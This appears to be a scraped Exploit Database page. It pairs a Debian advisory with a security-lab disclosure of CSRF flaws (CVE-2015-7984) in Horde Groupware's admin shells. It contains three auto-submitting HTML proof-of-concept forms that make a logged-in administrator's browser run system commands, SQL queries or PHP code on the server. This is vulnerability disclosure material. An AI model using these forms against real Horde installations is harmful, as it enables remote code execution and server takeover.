Package        : php-horde
Debian Bug     : 803641

It was discovered that the web-based administration interface in the
Horde Application Framework did not guard against Cross-Site Request
Forgery (CSRF) attacks.  As a result, other, malicious web pages could
cause Horde applications to perform actions as the Horde user.

The oldstable distribution (wheezy) did not contain php-horde
packages.

For the stable distribution (jessie), this problem has been fixed in
version 5.2.1+debian0-2+deb8u2.

For the testing distribution (stretch) and the unstable distribution
(sid), this problem has been fixed in version 5.2.8+debian0-1.

We recommend that you upgrade your php-horde packages.

these updates to your system and frequently asked questions can be

```
Advisory ID: HTB23272
Product: Horde Groupware
Vendor: http://www.horde.org
Vulnerable Version(s): 5.2.10  and probably prior
Tested Version: 5.2.10
Advisory Publication:  September 30, 2015  [without technical details]
Vendor Notification: September 30, 2015
Vendor Patch: October 22, 2015
Public Disclosure: November 18, 2015
Vulnerability Type: Cross-Site Request Forgery [CWE-352]
CVE Reference: CVE-2015-7984
Risk Level: High
CVSSv3 Base Score: 8.3 [CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H]
Solution Status: Fixed by Vendor
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge Security Research Lab discovered three Cross-Site Request Forgery (CSRF) vulnerabilities in a popular collaboration suite Horde Groupware, used by a variety of companies around the world. These vulnerabilities are very dangerous, since they can be used in targeted attacks against corporate clients. An attacker might be able to gain unauthorized access to information, stored in database, execute arbitrary commands on the server, compromise the entire application and perform attacks against application users and company’s infrastructure.

1) Cross-Site Request Forgery in Horde Groupware: CVE-2015-7984

1.1 The vulnerability exists due to failure in the "/admin/cmdshell.php" script to properly verify the source of HTTP request. A remote attacker can trick a logged-in administrator to visit a malicious page with CSRF exploit and execute arbitrary system commands on the server.

CSRF exploit below sends HTTP POST request to vulnerable script and instructs it to display output of "/bin/ls" command. As a result, you will see contents of "/admin/" directory:

<form action="http://[host]/admin/cmdshell.php" method="post" name="main">
<input type="hidden" name="cmd" value="ls">
<input value="submit" id="btn" type="submit" />
</form>
<script>
document.getElementById('btn').click();
</script>

1.2 The vulnerability exists due to failure in the "/admin/sqlshell.php" script to properly verify the source of HTTP request. A remote attacker can trick a logged-in administrator to visit a malicious page with CSRF exploit and execute arbitrary SQL queries with application’s database.

The exploit code below executes "SELECT version()" query and displays version of current MySQL server:

<form action="http://[host]/admin/sqlshell.php" method="post" name="main">
<input type="hidden" name="sql" value="SELECT version()">
<input value="submit" id="btn" type="submit" />
</form>
<script>
document.getElementById('btn').click();
</script>

1.3 The vulnerability exists due to failure in the "/admin/phpshell.php" script to properly verify the source of HTTP request. A remote attacker can trick a logged-in administrator to visit a malicious page with CSRF exploit and execute arbitrary php code on the server.

The exploit code below executes the "phpinfo()" function and displays its output:

<form action="http://[host]/admin/phpshell.php" method="post" name="main">
<input type="hidden" name="app" value="horde">
<input type="hidden" name="php" value="phpinfo();">
<input value="submit" id="btn" type="submit" />
</form>
<script>
document.getElementById('btn').click();
</script>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
